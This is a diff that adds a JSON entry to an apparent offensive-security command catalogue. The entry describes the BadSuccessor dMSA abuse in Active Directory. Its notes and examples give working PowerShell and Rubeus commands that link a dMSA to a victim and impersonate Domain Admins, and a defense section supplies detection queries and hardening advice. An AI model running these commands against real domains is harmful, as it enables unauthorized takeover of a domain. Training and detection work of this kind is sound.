@@ -1,0 +1,106 @@
+{
+  "id": "ad-dmsa-badsuccessor",
+  "name": "BadSuccessor - delegated MSA (dMSA) Migration Abuse",
+  "command": "Set-ADServiceAccount -Identity <target_account> -Replace @{\"msDS-ManagedAccountPrecededByLink\"=\"<victim_dn>\"}",
+  "description": "BadSuccessor (Akamai, 2025) abuses the delegated Managed Service Account (dMSA) migration feature on Windows Server 2025 domain controllers. By creating a dMSA and setting its msDS-ManagedAccountPrecededByLink to any target principal (and marking the migration completed), the dMSA is treated as the successor of that principal: the KDC issues it a PAC containing the victim's SIDs, so it inherits the victim's privileges and can obtain the victim's keys - effectively any user, including Domain Admins. Only the right to create/control a dMSA object in an OU is required.",
+  "platform": "windows",
+  "type": "command",
+  "opsec": "moderate",
+  "category": "Active Directory",
+  "subcategory": "Privilege Escalation",
+  "certifications": [
+    "CRTP"
+  ],
+  "primary_cert": "CRTP",
+  "source": "Akamai BadSuccessor research (CVE-2025)",
+  "tags": [
+    "dmsa",
+    "badsuccessor",
+    "server-2025",
+    "privilege-escalation",
+    "account-manipulation",
+    "kerberos",
+    "msDS-ManagedAccountPrecededByLink"
+  ],
+  "mitre": [
+    "T1098",
+    "T1078.002"
+  ],
+  "exam": "lab-only",
+  "notes": "=== PREREQUISITES ===\n  # - At least one Windows Server 2025 DC (dMSA feature present).\n  # - CreateChild on dMSA objects in an OU (or write over an existing dMSA).\n  #   This OU-level right is common and is NOT a classic DA/privileged right.\n\n=== CREATE A dMSA + LINK IT TO THE VICTIM ===\n  # Create the dMSA object (RSAT / AD module):\n  New-ADServiceAccount -Name <target_account> -DNSHostName <dc_host> -Path \"<ou_dn>\" -KerberosEncryptionType AES256\n  # Point it at the victim and mark migration as completed:\n  Set-ADServiceAccount -Identity <target_account> -Replace @{\"msDS-ManagedAccountPrecededByLink\"=\"<victim_dn>\"}\n  Set-ADServiceAccount -Identity <target_account> -Replace @{\"msDS-DelegatedMSAState\"=2}\n  # (BloodyAD can set the same attributes from Linux - see recommended.)\n\n=== OBTAIN THE SUCCESSOR TICKET (inherits victim SIDs) ===\n  # Rubeus requests a TGT for the dMSA; the KDC embeds the victim's SIDs in the PAC\n  # and returns the key material for impersonation:\n  Rubeus.exe asktgs /targetuser:<target_account> /service:krbtgt/<domain> /dmsa /opsec /nowrap\n  # Use the resulting ticket as the victim (DA) for DCSync / admin access.\n\n=== DETECT YOUR OWN FOOTPRINT ===\n  # The link attribute and dMSA state are the key indicators (see defense).\n\n=== ALTERNATIVES ===\n  ad-shadow-credentials       # key-material impersonation via msDS-KeyCredentialLink\n  Classic RBCD / S4U          # delegation-based impersonation",
+  "examples": [
+    {
+      "label": "Link the dMSA to a privileged victim",
+      "command": "Set-ADServiceAccount -Identity <target_account> -Replace @{\"msDS-ManagedAccountPrecededByLink\"=\"<victim_dn>\"}"
+    },
+    {
+      "label": "Create the dMSA in a writable OU",
+      "command": "New-ADServiceAccount -Name <target_account> -DNSHostName <dc_host> -Path \"<ou_dn>\" -KerberosEncryptionType AES256"
+    },
+    {
+      "label": "Request the successor TGT with Rubeus",
+      "command": "Rubeus.exe asktgs /targetuser:<target_account> /service:krbtgt/<domain> /dmsa /opsec /nowrap"
+    }
+  ],
+  "references": [
+    {
+      "title": "Akamai - BadSuccessor: Abusing dMSA",
+      "url": "https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory"
+    },
+    {
+      "title": "MITRE T1098 - Account Manipulation",
+      "url": "https://attack.mitre.org/techniques/T1098/"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "ad-bloodyad-toolkit",
+      "note": "BloodyAD can set the dMSA link attributes from Linux.",
+      "rel": "prereq"
+    },
+    {
+      "id": "ad-shadow-credentials",
+      "note": "Parallel key-material impersonation primitive.",
+      "rel": "alternative"
+    },
+    {
+      "id": "secretsdump-ntds",
+      "note": "DCSync/dump once you impersonate a Domain Admin.",
+      "rel": "next"
+    }
+  ],
+  "defense": {
+    "why_it_works": "The Server 2025 dMSA migration feature trusts msDS-ManagedAccountPrecededByLink (with msDS-DelegatedMSAState set to completed) to mean the dMSA legitimately succeeds the linked principal, so the KDC builds the dMSA's PAC from the predecessor's SIDs and provides key material. The only requirement is the ability to create or control a dMSA object in an OU - an often-delegated right that is not treated as privileged.",
+    "prerequisites": "At least one Windows Server 2025 DC and CreateChild/write rights over a dMSA object in some OU. No prior Domain Admin or classic privileged access is needed.",
+    "impact": "Impersonation of any principal including Domain Admins, inheriting their SIDs and keys - full domain compromise from a low-privileged OU delegation.",
+    "detection": "[MITRE T1098] Creation of a dMSA object (4741/5137) followed by writes to msDS-ManagedAccountPrecededByLink and msDS-DelegatedMSAState; Kerberos TGT requests for a new dMSA that resolve to privileged SIDs; dMSA activity from accounts that never administer service accounts.",
+    "artifacts": "Directory service object creation (5137) for msDS-DelegatedManagedServiceAccount; 5136 attribute modifications of msDS-ManagedAccountPrecededByLink; 4741 computer/service account creation; 4769 ticket requests for the dMSA.",
+    "splunk_spl": "index=windows (EventCode=5137 OR EventCode=5136) (Attribute_LDAP_Display_Name=\"msDS-ManagedAccountPrecededByLink\" OR Class=\"msDS-DelegatedManagedServiceAccount\")\n| stats values(Attribute_Value) by Account_Name, ObjectDN, _time",
+    "elastic_kql": "event.code:(\"5136\" or \"5137\") and winlog.event_data.AttributeLDAPDisplayName:\"msDS-ManagedAccountPrecededByLink\"",
+    "sentinel_kql": "SecurityEvent\n| where EventID in (5136, 5137)\n| where ObjectClass == \"msDS-DelegatedManagedServiceAccount\" or AttributeLDAPDisplayName == \"msDS-ManagedAccountPrecededByLink\"\n| project TimeGenerated, SubjectUserName, ObjectDN, AttributeLDAPDisplayName, AttributeValue",
+    "sigma_rules": "win_ad_dmsa_badsuccessor_link_write",
+    "prevention": "Audit and tightly restrict who can create dMSA objects (CreateChild on msDS-DelegatedManagedServiceAccount) in every OU; monitor and alert on writes to msDS-ManagedAccountPrecededByLink and msDS-DelegatedMSAState; apply Microsoft's dMSA hardening/patches; keep DA/Tier 0 objects out of OUs with broad create delegations.",
+    "sources": [
+      "https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory",
+      "https://attack.mitre.org/techniques/T1098/"
+    ],
+    "detections": [
+      {
+        "platform": "sentinel",
+        "name": "dMSA linked to a predecessor principal (BadSuccessor)",
+        "logic": "SecurityEvent\n| where EventID == 5136\n| where AttributeLDAPDisplayName == \"msDS-ManagedAccountPrecededByLink\"\n| project TimeGenerated, SubjectUserName, ObjectDN, AttributeValue",
+        "data_source": "windows-security",
+        "log_ids": [
+          "5136"
+        ],
+        "attack": [
+          "T1098"
+        ],
+        "fidelity": "behavioral",
+        "confidence": "high",
+        "false_positives": "Genuine administrator-driven dMSA migrations also set this attribute.",
+        "tuning": "Alert when the attribute is written by an account outside the service-account admin group, or when the linked principal is a privileged/Tier 0 object."
+      }
+    ]
+  }
+}
